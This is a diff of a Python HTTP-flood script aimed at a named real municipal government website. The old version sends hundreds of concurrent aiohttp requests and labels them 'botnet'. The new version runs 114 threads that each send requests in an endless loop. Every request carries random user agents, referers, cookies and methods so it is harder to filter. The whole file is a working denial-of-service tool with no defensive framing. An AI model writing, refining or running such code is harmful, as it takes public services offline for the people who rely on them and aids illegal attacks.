@@ -1,13 +1,12 @@
-import aiohttp
-import asyncio
+import threading
+import requests
 import random
-import aiofiles
 import string
 
-async def load_list_from_file(file_path):
-    async with aiofiles.open(file_path, mode='r') as file:
-        lines = await file.read()
-    return lines.splitlines()
+def load_list_from_file(file_path):
+    with open(file_path, mode='r') as file:
+        lines = file.readlines()
+    return [line.strip() for line in lines]
 
 def generate_headers(user_agent, referer, cookie):
     return {
@@ -28,39 +27,37 @@ def generate_headers(user_agent, referer, cookie):
         'Cookie': cookie,
     }
 
-async def generate_cookie():
+def generate_cookie():
     cookie_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
     cookie_value = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
     return f"{cookie_name}={cookie_value}"
 
-async def make_request(session, method, url, headers, count):
-    try:
-        async with session.request(method, url, headers=headers) as response:
-            if response.status == 200:
-                print(f"Request botnet #{count} sent successfully")
-            return response.status
-    except Exception as e:
-        print(f"Request  #{count} failed: {e}")
+def make_request(method, url, headers, request_count):
+    with requests.request(method, url, headers=headers) as response:
+        if response.status_code == 200:
+            print(f"Request #{request_count} sent successfully")
 
-async def main():
-    user_agents = await load_list_from_file('useragents.txt')
-    referers = await load_list_from_file('referers.txt')
-    url = "https://www.guaruja.sp.gov.br/"
-    methods = ['GET', 'HEAD', 'POST']
-    count = 1
+def worker(user_agents, referers, url, methods):
+    request_count = 0
+    while True:
+        user_agent = random.choice(user_agents)
+        referer = random.choice(referers)
+        cookie = generate_cookie()
+        headers = generate_headers(user_agent, referer, cookie)
+        method = random.choice(methods)
+        make_request(method, url, headers, request_count)
+        request_count += 1
 
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-        for _ in range(297):
-            for method in methods:
-                user_agent = random.choice(user_agents)
-                referer = random.choice(referers)
-                cookie = await generate_cookie()
-                headers = generate_headers(user_agent, referer, cookie)
-                task = asyncio.ensure_future(make_request(session, method, url, headers, count))
-                tasks.append(task)
-                count += 1
-        await asyncio.gather(*tasks)
+user_agents = load_list_from_file('useragents.txt')
+referers = load_list_from_file('referers.txt')
+url = "https://www.guaruja.sp.gov.br/"
+methods = ['GET', 'HEAD', 'POST']
 
-if __name__ == "__main__":
-    asyncio.run(main())
+threads = []
+for _ in range(114):  # Adjust the number of threads as necessary
+    thread = threading.Thread(target=worker, args=(user_agents, referers, url, methods))
+    thread.start()
+    threads.append(thread)
+
+for thread in threads:
+    thread.join()
